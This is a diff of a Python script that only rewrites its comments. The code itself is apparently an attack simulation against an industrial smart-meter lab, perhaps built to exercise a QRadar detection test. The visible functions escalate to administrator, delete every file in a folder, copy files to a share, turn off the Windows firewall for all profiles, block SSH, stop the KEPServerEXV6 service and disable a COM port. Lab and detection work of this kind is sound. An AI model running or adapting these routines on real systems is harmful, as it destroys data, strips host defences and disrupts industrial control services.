@@ -20,10 +20,13 @@ from kepconfig import connection, admin, connectivity
 import json
 import sys
 
-copiedpath = "C:\\Windows\\temp\\Smartmeter" # Put shared directory
+# Set the path for the shared directory
+copiedpath = "C:\\Windows\\temp\\Smartmeter"
+
+# Set the path for the Smart Meter folder
 smartmeterpath = "C:\\Users\\Student\\Documents\\AttackFolder"
 
-#Check if administrator
+# Check if the script is running with administrator privileges, if not, restart with elevated privileges
 def check_admin():
     try:
         isAdmin = windll.shell32.IsUserAnAdmin()
@@ -32,7 +35,7 @@ def check_admin():
     if not isAdmin:
         windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)
 
-#Delete file in specific folder
+# Delete files in a specific folder
 def delete_files(folder_path):
     for root, dirs, files in walk(folder_path):
         for file in files:
@@ -41,6 +44,7 @@ def delete_files(folder_path):
             remove(og)
             print("File: " + str(og) + " is deleted")
 
+# Copy files from a folder to the shared directory
 def copy_file(folder_path):
     for root, dirs, files in walk(folder_path):
         for file in files:
@@ -49,9 +53,7 @@ def copy_file(folder_path):
             copyfile(og,dest)
             print("File: " + str(og) + " is copied")
 
-    
-
-#Disable firewall
+# Disable the firewall
 def disable_firewall():
     cp = run('netsh advfirewall set allprofiles state off',stdout=PIPE , shell=True)
     if cp.stdout.decode('utf-8').strip() == "Ok.":
@@ -59,7 +61,7 @@ def disable_firewall():
     else:
         print("Firewall failed to disable\nFail.\n")
 
-#Disable ssh from firewall
+# Disable SSH from the firewall
 def disable_ssh():
     count = 0
     cp = run('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22',stdout=PIPE)
@@ -101,7 +103,7 @@ def disable_ssh():
     else:
         print("SSH Failed to Disable.\nFail.\n")
         
-#Disable Kepserver Service
+# Stop the KEPServerEXV6 service
 def disable_kepserver():
     service_name = "KEPServerEXV6"
     cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
@@ -141,7 +143,7 @@ def run_modinterrupt():
         print("Modinterrupt is not running. \n Fail.\n")
 
 
-#Disable COM Port
+#Disable a COM port
 def disable_COMPort():
 
     netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
